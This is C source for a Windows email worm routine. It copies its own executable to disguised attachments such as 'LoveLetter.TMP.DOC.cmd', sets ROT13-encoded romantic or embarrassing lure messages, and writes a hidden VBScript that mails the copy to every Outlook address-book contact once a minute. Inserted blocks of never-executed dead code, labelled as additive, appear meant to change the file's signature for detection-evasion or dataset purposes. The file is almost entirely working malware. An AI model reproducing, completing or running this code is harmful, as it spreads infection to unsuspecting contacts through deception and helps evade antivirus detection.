#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shellapi.h>

#pragma optimize("", off)
DWORD WINAPI _MassMailMain(void)
{
    char Subject[100], Message[512], Attachment[100], MyPath[100], VBSFile[50], RanNu[20];
    unsigned char VBS_Mail[2000];
    FILE *file;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    while (1) {
        memset(Subject, 0, sizeof(Subject));
        memset(Message, 0, sizeof(Message));
        memset(Attachment, 0, sizeof(Attachment));
        memset(MyPath, 0, sizeof(MyPath));
        memset(VBS_Mail, 0, sizeof(VBS_Mail));
        memset(VBSFile, 0, sizeof(VBSFile));
        memset(RanNu, 0, sizeof(RanNu));

        srand(GetTickCount());
        sprintf(RanNu, "\\mailer.vbs");
        GetEnvironmentVariableA("HOMEDRIVE", Attachment, sizeof(Attachment));
        strcpy(VBSFile, Attachment);
        strcat(VBSFile, RanNu);
        GetModuleFileNameA(NULL, MyPath, sizeof(MyPath));

        // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
        if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
            char *tmp = (char *)malloc(64);
            if (tmp != NULL) {
                strcpy(tmp, "dummy");
                volatile DWORD len = strlen(tmp);
                volatile BYTE check = 0;
                for (volatile DWORD i = 0; i < len; i++) {
                    check ^= tmp[i];
                }
                volatile DWORD j = 0;
                while (j < 2) {
                    // read existing local (no modification)
                    check += j + (DWORD)MyPath[0];
                    j++;
                }
                char tmp2[32];
                memcpy(tmp2, tmp, 4);
                volatile DWORD val = (DWORD)tmp2[0] + check;
                val += len;
                free(tmp);
            }
        }

        switch (rand() % 5) {
            case 0:
                strcpy(Subject, "Zl cnffvbangr ybir gbjneqf lbh");
                strcpy(Message, "Zl ybiryrggre sbe lbh vf va gur nggnpurq qbphzrag. =)");
                strcat(Attachment, "\\LoveYouLife.TMP.DOC.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
            case 1:
                strcpy(Subject, "Lbh bjr zr ovt gvzr");
                strcpy(Message, "Lbh pna'g whfg sbetrg nobhg gur ovyy lbh yrsg zr jvgu. V nggnpurq gb gur qbphzragf nf cebbs lbh bjr zr.");
                strcat(Attachment, "\\DocumentsPay.TMP.DOC.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
            case 2:
                strcpy(Subject, "Url! Purpx guvf bhg!");
                strcpy(Message, "V guvax gung'f lbh va guvf cvpgher, ubj rzonerffvat!");
                strcat(Attachment, "\\PartyTips.TMP.JPEG.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
            case 3:
                strcpy(Subject, "Vf gung lbh?");
                strcpy(Message, "V erpnyy lbh orvat va guvf cvpgher, juvpu crefba ner lbh?");
                strcat(Attachment, "\\BeachPicture.TMP.JPEG.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
            case 4:
                strcpy(Subject, "V YBIR LBH!");
                strcpy(Message, "Cyrnfr ernq gur nggnpurq ybir yrggre sebz zr. ;)");
                strcat(Attachment, "\\LoveLetter.TMP.DOC.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
        }

        sprintf(VBS_Mail,
                 "qvz k\r\n"
                 "erz\r\n"
                 "ba reebe erfhzr arkg\r\n"
                 "erz\r\n"
                 "Frg sfb =\"Fpevcgvat.SvyrFlfgrz.Bowrpg\"\r\n"
                 "erz\r\n"
                 "Frg fb=PerngrBowrpg(sfb)\r\n"
                 "erz\r\n"
                 "Frg by=PerngrBowrpg(\"Bhgybbx.Nccyvpngvba\")\r\n"
                 "erz\r\n"
                 "Frg bhg=JFpevcg.PerngrBowrpg(\"Bhgybbx.Nccyvpngvba\")\r\n"
                 "erz\r\n"
                 "Frg zncv = bhg.TrgAnzrFcnpr(\"ZNCV\")\r\n"
                 "erz\r\n"
                 "Frg n = zncv.NqqerffYvfgf(1)\r\n"
                 "erz\r\n"
                 "Frg nr=n.NqqerffRagevrf\r\n"
                 "erz\r\n"
                 "Sbe k=1 Gb nr.Pbhag\r\n"
                 "erz\r\n"
                 "Frg pv=by.PerngrVgrz(0)\r\n"
                 "erz\r\n"
                 "Frg Znvy=pv\r\n"
                 "erz\r\n"
                 "Znvy.gb=by.TrgAnzrFcnpr(\"ZNCV\").NqqerffYvfgf(1).NqqerffRagevrf(k)\r\n"
                 "erz\r\n"
                 "Znvy.Fhowrpg=\"%s\"\r\n"
                 "erz\r\n"
                 "Znvy.Obql=\"%s\"\r\n"
                 "erz\r\n"
                 "Znvy.Nggnpuzragf.Nqq(\"%s\")\r\n"
                 "erz\r\n"
                 "Znvy.fraq\r\n"
                 "erz\r\n"
                 "Arkg\r\n"
                 "erz\r\n"
                 "by.Dhvg\r\n",
                 Subject, Message, Attachment);

        _CiphStr((char *)VBS_Mail, (char *)VBS_Mail);

        file = fopen(VBSFile, "wb");
        fputs((const char *)VBS_Mail, file);
        fclose(file);

        ShellExecuteA(NULL, "open", VBSFile, NULL, NULL, SW_HIDE);
        Sleep(60000);
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        // read existing local (no modification)
        extra_val += (DWORD)VBS_Mail[0];
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    return 0; // unreachable
}
#pragma optimize("", on)
